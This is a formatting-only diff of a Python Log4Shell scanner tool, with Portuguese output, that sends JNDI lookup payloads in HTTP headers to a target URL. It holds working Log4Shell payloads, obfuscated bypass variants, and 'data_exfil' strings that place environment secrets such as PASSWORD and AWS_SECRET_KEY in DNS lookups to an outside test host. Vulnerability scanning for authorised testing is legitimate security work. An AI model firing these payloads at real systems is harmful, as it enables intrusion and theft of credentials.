@@ -41,10 +41,34 @@ logger = logging.getLogger("mytools.log4shell")
 
 _CATEGORY_MAP: dict[str, list[str]] = {
     "jndi_basic": ["ldap_basic", "rmi_basic", "dns_basic", "ldaps_basic", "iiop_basic"],
-    "jndi_obfuscated": ["ldap_lower", "ldap_unicode", "ldap_envvar", "ldap_proplookup", "ldap_dollar"],
-    "header_injection": ["ua_jndi", "referer_jndi", "xff_jndi", "xapi_jndi", "auth_jndi"],
-    "data_exfil": ["exfil_hostname", "exfil_username", "exfil_password", "exfil_sysprop", "exfil_env"],
-    "bypass": ["bypass_nested", "bypass_doublewrap", "bypass_exception", "bypass_newline", "bypass_chunked"],
+    "jndi_obfuscated": [
+        "ldap_lower",
+        "ldap_unicode",
+        "ldap_envvar",
+        "ldap_proplookup",
+        "ldap_dollar",
+    ],
+    "header_injection": [
+        "ua_jndi",
+        "referer_jndi",
+        "xff_jndi",
+        "xapi_jndi",
+        "auth_jndi",
+    ],
+    "data_exfil": [
+        "exfil_hostname",
+        "exfil_username",
+        "exfil_password",
+        "exfil_sysprop",
+        "exfil_env",
+    ],
+    "bypass": [
+        "bypass_nested",
+        "bypass_doublewrap",
+        "bypass_exception",
+        "bypass_newline",
+        "bypass_chunked",
+    ],
 }
 
 _TOKEN: str | None = None
@@ -54,7 +78,9 @@ def _get_token() -> str:
     """Gera token unico por scan (lazy)."""
     global _TOKEN
     if _TOKEN is None:
-        _TOKEN = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
+        _TOKEN = "".join(
+            secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12)
+        )
     return _TOKEN
 
 
@@ -63,7 +89,9 @@ def _build_jndi_payload(protocol: str, token: str) -> str:
     return "${jndi:" + protocol + "://" + token + ".log4shell-test.com/a}"
 
 
-async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, dict[str, str], bytes]:
+async def _test_baseline(
+    client: httpx.AsyncClient, url: str
+) -> tuple[int, int, dict[str, str], bytes]:
     """Envia request baseline para obter status, tamanho, headers e corpo."""
     try:
         resp = await client.get(url, follow_redirects=True)
@@ -90,7 +118,9 @@ async def _test_jndi_basic(
 
     for technique, header_name, payload in test_cases:
         try:
-            resp = await client.get(url, headers={header_name: payload}, follow_redirects=True)
+            resp = await client.get(
+                url, headers={header_name: payload}, follow_redirects=True
+            )
             resp_body = resp.content.decode("utf-8", errors="ignore")
 
             vulnerable = False
@@ -145,16 +175,34 @@ async def _test_jndi_obfuscated(
     results: list[Log4ShellAttempt] = []
 
     test_cases: list[tuple[str, str, str]] = [
-        ("ldap_lower", "User-Agent", "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
-        ("ldap_unicode", "User-Agent", "${j${}ndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
+        (
+            "ldap_lower",
+            "User-Agent",
+            "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
+        ),
+        (
+            "ldap_unicode",
+            "User-Agent",
+            "${j${}ndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
+        ),
         ("ldap_envvar", "User-Agent", "${jndi:${env:USER}.log4shell-test.com/a}"),
-        ("ldap_proplookup", "User-Agent", "${jndi:${java:os.name}.log4shell-test.com/a}"),
-        ("ldap_dollar", "User-Agent", "${jndi:ldap://" + _get_token() + ".log4shell-test.com/${sys:user.dir}}"),
+        (
+            "ldap_proplookup",
+            "User-Agent",
+            "${jndi:${java:os.name}.log4shell-test.com/a}",
+        ),
+        (
+            "ldap_dollar",
+            "User-Agent",
+            "${jndi:ldap://" + _get_token() + ".log4shell-test.com/${sys:user.dir}}",
+        ),
     ]
 
     for technique, header_name, payload in test_cases:
         try:
-            resp = await client.get(url, headers={header_name: payload}, follow_redirects=True)
+            resp = await client.get(
+                url, headers={header_name: payload}, follow_redirects=True
+            )
             resp_body = resp.content.decode("utf-8", errors="ignore")
 
             vulnerable = False
@@ -216,7 +264,9 @@ async def _test_header_injection(
 
     for technique, header_name in test_cases:
         try:
-            resp = await client.get(url, headers={header_name: payload}, follow_redirects=True)
+            resp = await client.get(
+                url, headers={header_name: payload}, follow_redirects=True
+            )
             resp_body = resp.content.decode("utf-8", errors="ignore")
 
             vulnerable = False
@@ -271,16 +321,40 @@ async def _test_data_exfil(
     results: list[Log4ShellAttempt] = []
 
     test_cases: list[tuple[str, str, str]] = [
-        ("exfil_hostname", "User-Agent", "${jndi:ldap://" + _get_token() + ".${hostName}.log4shell-test.com/a}"),
-        ("exfil_username", "Referer", "${jndi:ldap://" + _get_token() + ".${env:USER}.log4shell-test.com/a}"),
-        ("exfil_password", "X-Forwarded-For", "${jndi:ldap://" + _get_token() + ".${env:PASSWORD}.log4shell-test.com/a}"),
-        ("exfil_sysprop", "X-Real-IP", "${jndi:ldap://" + _get_token() + ".${java:os.name}.log4shell-test.com/a}"),
-        ("exfil_env", "X-Api-Key", "${jndi:ldap://" + _get_token() + ".${env:AWS_SECRET_KEY}.log4shell-test.com/a}"),
+        (
+            "exfil_hostname",
+            "User-Agent",
+            "${jndi:ldap://" + _get_token() + ".${hostName}.log4shell-test.com/a}",
+        ),
+        (
+            "exfil_username",
+            "Referer",
+            "${jndi:ldap://" + _get_token() + ".${env:USER}.log4shell-test.com/a}",
+        ),
+        (
+            "exfil_password",
+            "X-Forwarded-For",
+            "${jndi:ldap://" + _get_token() + ".${env:PASSWORD}.log4shell-test.com/a}",
+        ),
+        (
+            "exfil_sysprop",
+            "X-Real-IP",
+            "${jndi:ldap://" + _get_token() + ".${java:os.name}.log4shell-test.com/a}",
+        ),
+        (
+            "exfil_env",
+            "X-Api-Key",
+            "${jndi:ldap://"
+            + _get_token()
+            + ".${env:AWS_SECRET_KEY}.log4shell-test.com/a}",
+        ),
     ]
 
     for technique, header_name, payload in test_cases:
         try:
-            resp = await client.get(url, headers={header_name: payload}, follow_redirects=True)
+            resp = await client.get(
+                url, headers={header_name: payload}, follow_redirects=True
+            )
             resp_body = resp.content.decode("utf-8", errors="ignore")
 
             vulnerable = False
@@ -332,16 +406,44 @@ async def _test_bypass(
     results: list[Log4ShellAttempt] = []
 
     test_cases: list[tuple[str, str, str]] = [
-        ("bypass_nested", "User-Agent", "${jndi:${lower:l}dap://" + _get_token() + ".log4shell-test.com/a}"),
-        ("bypass_doublewrap", "User-Agent", "${jndi:${::-j}${::-n}${::-d}i:ldap://" + _get_token() + ".log4shell-test.com/a}"),
-        ("bypass_exception", "User-Agent", "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
-        ("bypass_newline", "Referer", "test%0d%0a${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
-        ("bypass_chunked", "X-Forwarded-For", "test;" + chr(24) + "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
+        (
+            "bypass_nested",
+            "User-Agent",
+            "${jndi:${lower:l}dap://" + _get_token() + ".log4shell-test.com/a}",
+        ),
+        (
+            "bypass_doublewrap",
+            "User-Agent",
+            "${jndi:${::-j}${::-n}${::-d}i:ldap://"
+            + _get_token()
+            + ".log4shell-test.com/a}",
+        ),
+        (
+            "bypass_exception",
+            "User-Agent",
+            "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
+        ),
+        (
+            "bypass_newline",
+            "Referer",
+            "test%0d%0a${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
+        ),
+        (
+            "bypass_chunked",
+            "X-Forwarded-For",
+            "test;"
+            + chr(24)
+            + "${jndi:ldap://"
+            + _get_token()
+            + ".log4shell-test.com/a}",
+        ),
     ]
 
     for technique, header_name, payload in test_cases:
         try:
-            resp = await client.get(url, headers={header_name: payload}, follow_redirects=True)
+            resp = await client.get(
+                url, headers={header_name: payload}, follow_redirects=True
+            )
             resp_body = resp.content.decode("utf-8", errors="ignore")
 
             vulnerable = False
@@ -444,7 +546,12 @@ def print_results(result: Log4ShellResult) -> None:
             if a.details:
                 print(color(f"      Detalhes: {a.details}", Cyber.GRAY))
             print_exploit_info(a.exploit, a.tool)
-        print(color(f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis", Cyber.WHITE))
+        print(
+            color(
+                f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
+                Cyber.WHITE,
+            )
+        )
     else:
         print(color("\n  [-] Nenhum Log4Shell detectado", Cyber.YELLOW))
 
@@ -482,7 +589,9 @@ async def run_scan(
                 all_attempts.extend(await _test_bypass(client, target))
 
         vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
-        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})
+        blocked_techs = list(
+            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
+        )
         issues: list[str] = []
 
         if not vuln_techs and not blocked_techs:
@@ -495,7 +604,9 @@ async def run_scan(
             vulnerable_techniques=vuln_techs,
             blocked_techniques=blocked_techs,
             issues=issues,
-            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),
+            overall_status="vulnerable"
+            if vuln_techs
+            else ("safe" if blocked_techs else "unknown"),
         )
 
         print_results(result)
@@ -521,7 +632,10 @@ def banner_art() -> None:
    |  _  |_| | |__| |_| | |_| | | || | | | |_| | |_| | |_| | |_| |
    |_|  \___/|_____\___/ \____|_|___|_|  \___/ \___/|____/|____/
 """
-    create_banner(art, f"   log4shell: jndi_basic, obfuscated, header, exfil, bypass [{_get_token()}]")()
+    create_banner(
+        art,
+        f"   log4shell: jndi_basic, obfuscated, header, exfil, bypass [{_get_token()}]",
+    )()
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -543,7 +657,14 @@ def build_parser() -> argparse.ArgumentParser:
         "-c",
         "--category",
         default="all",
-        choices=["all", "jndi_basic", "jndi_obfuscated", "header_injection", "data_exfil", "bypass"],
+        choices=[
+            "all",
+            "jndi_basic",
+            "jndi_obfuscated",
+            "header_injection",
+            "data_exfil",
+            "bypass",
+        ],
         help="Categoria de testes (default: todas)",
     )
     add_common_args(parser)
@@ -572,7 +693,9 @@ def main() -> int:
         parser=build_parser(),
         banner_fn=banner_art,
         run_fn=run_once,
-        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
+        has_target=lambda a: bool(
+            getattr(a, "url", None) or getattr(a, "target", None)
+        ),
         prompt="log4shell> ",
         description="Log4Shell interativo.",
         example="https://target.com -c jndi_basic",
